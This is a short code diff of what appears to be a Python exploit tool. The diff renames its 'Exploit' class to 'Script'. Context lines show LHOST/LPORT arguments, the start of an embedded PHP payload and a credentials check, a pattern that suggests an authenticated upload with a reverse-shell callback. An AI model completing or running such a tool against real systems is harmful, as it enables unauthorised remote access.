@@ -28,7 +28,7 @@ LHOST = args.LHOST
 LPORT = args.LPORT
 
 
-class Exploit:
+class Script:
 
     payload = f"""<?php
     /**
@@ -161,7 +161,7 @@ class Exploit:
 
 if __name__ == '__main__':
 
-    run = Exploit()
+    run = Script()
 
     try:
         if host is not None and username_value is not None and password_value is not None \
